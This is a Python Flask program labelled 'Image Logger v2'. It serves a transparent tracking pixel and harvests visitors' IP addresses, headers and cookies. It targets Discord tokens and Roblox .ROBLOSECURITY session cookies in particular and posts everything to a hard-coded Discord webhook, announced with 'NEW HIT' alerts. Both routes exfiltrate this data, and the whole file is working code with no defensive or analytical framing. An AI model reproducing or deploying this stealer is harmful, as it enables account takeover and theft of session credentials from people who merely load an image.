from flask import Flask, request, Response
import requests
import json
from datetime import datetime
import os
import base64

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"

# Imagen pixel transparente en base64
PIXEL = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")

@app.route('/')
def index():
    # Capturar TODAS las cookies
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Buscar cookies específicas
    discord_token = cookies.get('token', 'No token found')
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No Roblox cookie found')
    
    # También buscar en otras variaciones
    if discord_token == 'No token found':
        discord_token = cookies.get('discord_token', 'No token found')
    if discord_token == 'No token found':
        discord_token = cookies.get('discord', 'No token found')
    
    # Capturar headers completos para debug
    headers = dict(request.headers)
    
    # Datos del usuario
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    # Construir mensaje para Discord
    embed = {
        "title": "🖼️ IMAGE LOGGER - COOKIES CAPTURADAS",
        "description": f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n**IP:** {ip}",
        "color": 16711680,
        "fields": [
            {"name": "🌐 IP", "value": ip, "inline": True},
            {"name": "🔗 Referer", "value": str(referer)[:100], "inline": True},
            {"name": "🖥️ User Agent", "value": str(user_agent)[:100], "inline": False},
            {"name": "🔑 Discord Token", "value": f"```{discord_token}```", "inline": False},
            {"name": "🍪 Roblox Cookie (.ROBLOSECURITY)", "value": f"```{roblox_cookie}```", "inline": False},
            {"name": "📋 ALL COOKIES", "value": f"```json\n{json.dumps(cookies, indent=2)[:1000]}```", "inline": False},
            {"name": "📋 ALL HEADERS", "value": f"```json\n{json.dumps(dict(headers), indent=2)[:1000]}```", "inline": False}
        ],
        "footer": {"text": "Image Logger v2"}
    }
    
    # Enviar a Discord
    try:
        response = requests.post(WEBHOOK_URL, json={"content": "@everyone **NEW HIT**", "embeds": [embed]}, timeout=10)
        print(f"Webhook response: {response.status_code}")
    except Exception as e:
        print(f"Webhook error: {e}")
    
    # Devolver imagen pixel
    return Response(PIXEL, mimetype='image/png')

@app.route('/track')
def track():
    # Capturar cookies
    cookies = {}
    cookie_string = request.headers.get('Cookie', '')
    
    if cookie_string:
        for cookie in cookie_string.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    discord_token = cookies.get('token', 'No token')
    roblox_cookie = cookies.get('.ROBLOSECURITY', 'No cookie')
    
    # Enviar a Discord
    try:
        requests.post(WEBHOOK_URL, json={
            "content": "🎯 **TRACKING HIT**",
            "embeds": [{
                "fields": [
                    {"name": "IP", "value": request.remote_addr, "inline": True},
                    {"name": "Token", "value": f"```{discord_token}```", "inline": False},
                    {"name": "Cookie", "value": f"```{roblox_cookie}```", "inline": False},
                    {"name": "All Cookies", "value": f"```json\n{json.dumps(cookies, indent=2)[:500]}```", "inline": False}
                ]
            }]
        }, timeout=10)
    except:
        pass
    
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
